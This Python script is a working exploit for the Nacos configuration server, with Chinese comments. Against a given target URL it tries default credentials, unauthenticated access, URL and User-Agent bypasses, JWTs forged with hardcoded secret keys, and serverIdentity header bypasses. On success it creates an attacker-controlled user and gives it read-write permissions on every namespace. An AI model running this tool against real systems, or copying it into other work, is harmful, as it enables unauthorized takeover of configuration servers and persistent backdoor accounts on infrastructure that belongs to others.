#!/usr/bin/env python3
# coding = utf-8
# Time   : 2023/5/9 10:29

import random
import string
import argparse
import urllib
import requests

"""
nacos 权限绕过脚本
python3 NacosAddUser.py -u http://192.168.1.2:8848/
"""

proxy = "http://127.0.0.1:8080"
# proxies = {"http": proxy, "https": proxy}
proxies = {}


def parse_args():
    parser = argparse.ArgumentParser(description='Nacos AddUser')
    parser.add_argument('-u', "--url", help='Target url, example: http://127.0.0.1:8848/')
    args = parser.parse_args()
    return args


headers = {"sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
           "Accept": "application/json, text/plain, */*",
           "Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?0",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5612.138 Safari/517.26",
           "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
           "Accept-Encoding": "gzip, deflate",
           "Accept-Language": "zh-CN,zh;q=0.9"}


def success(text):
    print(f"[+] {text}")


def info(text):
    print(f"[*] {text}")


def fail(text):
    print(f"[-] {text}")


class NacosAddUser:
    def __init__(self, url) -> None:
        if url.endswith("/"):
            self.baseurl = url[:-1]
        else:
            self.baseurl = url

        self.context = "/nacos"
        self.username = "nacos" + str("".join(random.sample(string.digits, random.randint(1, 3))))
        self.password = "nac0s123"

    def run(self):
        self.default_user_pass()
        self.auth_check()
        self.url_bypass()
        self.user_agent_bypass()
        self.jwt_bypass()
        self.identity_bypass()

    # 默认账号密码
    def default_user_pass(self):
        info("check default user nacos/nacos...")
        url = self.baseurl + self.context + "/v1/auth/users/login"
        data = {"username": "nacos", "password": "nacos"}
        resp = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
        if "accessToken" in resp.text:
            success("nacos/nacos exsit!")
            exit(0)

    # 默认未授权
    def auth_check(self):
        info("check auth enable...")
        url = self.baseurl + self.context + "/v1/auth/users/"
        data = {"username": self.username, "password": self.password}
        resp = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
        self._parse_adduser_result(resp)

    # UA绕过
    def user_agent_bypass(self):
        info("check ua bypass...")
        url = self.baseurl + self.context + "/v1/auth/users"
        data = {"username": self.username, "password": self.password}
        UA = {"User-Agent": "Nacos-Server" + headers["User-Agent"]}
        new_headers = {**headers, **UA}  # 区分大小写
        resp = requests.post(url, headers=new_headers, data=data, verify=False, proxies=proxies)
        self._parse_adduser_result(resp)

    # url 末尾斜杠绕过
    def url_bypass(self):
        info("check url bypass...")
        url = self.baseurl + self.context + "/v1/auth/users/"
        data = {"username": self.username, "password": self.password}
        resp = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
        self._parse_adduser_result(resp)

    # jwt secret key 硬编码绕过
    def jwt_bypass(self):
        info("check jwt bypass...")
        url = self.baseurl + self.context + "/v1/auth/users"
        jwts = [
            # SecretKey012345678901234567890123456789012345678901234567890123456789
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ",

            # VGhpc0lzTXlDdXN0b21TZWNyZXRLZXkwMTIzNDU2Nzg=
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0._GhyhPBLXfGVgWIAGnNT7z9mPL6-SPDAKorJ8eA1E3ZjnCPVkJYHq7OWGCm9knnDloJ7_mKDmSlHtUgNXKkkKw",

            # U2VjcmV0S2V5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.uSFCyir6S9MzNTOYLwfWIm1eQo6eO3tWskYA6fgQu55GQdrFO-4IvP6oBEGblAbYotMA6ZaS9l0ySsW_2toFPQ",

            # N2xkQXA2TkZVaGdyVU9QRllONDVJOHhVYUdtQWtjOEY=
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.jHIPHGlyaC7qKAGj0G6Kgb1WmrIpHosCnP8cHC24zceHpbyD7cmYuLc9r1oj3J6oFGr3KMnuKJlvTy8dopwNvw",

            # qwe1rty2ui3opl4kjh5gf6dsazx7cvbnm
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im5hY29zIiwiaWF0IjoyNjE2MjM5MDIyfQ.BEtiFKLAleuBCeakAoC6na-Lr8mfOUYUUm3nxaM0v3L5NeLk7UGZTDXCJQRguQDgU2HYE1VK9ETDIB-qjgqVnw",

        ]
        for jwt in jwts:
            info(f"testing jwt: '{jwt}'")
            data = {"username": self.username, "password": self.password, "accessToken": jwt}
            resp = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
            self._parse_adduser_result(resp)

    # 开启授权后identity硬编码绕过
    def identity_bypass(self):
        info("check identity bypass...")
        identities = [
            {"serverIdentity": "security"},  # nacos < 2.2.1 默认
            {"test": "test"},
            {"aaa": "bbb"},
            {"example": "example"},
            {"authKey": "nacosSecurty"},
        ]
        url = self.baseurl + self.context + "/v1/auth/users"

        data = {"username": self.username, "password": self.password}
        for identity in identities:
            key = list(identity.keys())[0]
            value = identity.get(key)
            info(f"testing identity key value: '{key}: {value}'")
            new_headers = {**headers, **identity}
            resp = requests.post(url, headers=new_headers, data=data, verify=False, proxies=proxies)

            if 'create user ok!' in resp.text:
                success(f"add user {self.username}/{self.password} success!")
                namespace_ids = self.get_namespaces(identity)
                self.add_role(identity)
                self.add_permissions(identity, namespace_ids)
                success("done.")
                exit(0)
            elif "already exist!" in resp.text:
                info(f"{self.username} already exist")
                exit(0)

    # identity权限绕过，获取命名空间
    def get_namespaces(self, identity):
        url = self.baseurl + self.context + "/v1/console/namespaces"
        new_headers = {**headers, **identity}
        resp = requests.get(url, headers=new_headers, verify=False, proxies=proxies)
        data = resp.json().get('data')
        namespace_ids = []
        for namespace in data:
            id = namespace['namespace']
            namespace_ids.append(id)
        return namespace_ids

    # 添加角色，ROLE_ + 用户名
    def add_role(self, identity):
        url = self.baseurl + self.context + "/v1/auth/roles"
        new_headers = {**headers, **identity}
        data = {"role": 'ROLE_' + self.username, "username": self.username}
        resp = requests.post(url, headers=new_headers, data=data, verify=False, proxies=proxies)
        if 'add role ok!' in resp.text:
            success("add role ok!")
        else:
            fail("add role error")
            exit(0)

    # 添加权限
    def add_permissions(self, identity, namespace_ids):
        url = self.baseurl + self.context + "/v1/auth/permissions"
        new_headers = {**headers, **identity}

        for namespace_id in namespace_ids:
            info("namespace_id: " + namespace_id)
            data = {"role": 'ROLE_' + self.username, "resource": namespace_id + ':*:*', "action": "rw"}
            resp = requests.post(url, headers=new_headers, data=data, verify=False, proxies=proxies)
            if 'add permission ok!' in resp.text:
                success(f"add permission ok!")
            else:
                fail("add permission error")

    def _parse_adduser_result(self, resp):
        body = resp.text
        if "already exist!" in body:
            info(f"{self.username} already exist")
            exit(0)
        elif "create user ok!" in body:
            success(f"add user {self.username}/{self.password} success!")
            exit(0)


def main():
    args = parse_args()
    NacosAddUser(args.url).run()


if __name__ == '__main__':
    main()
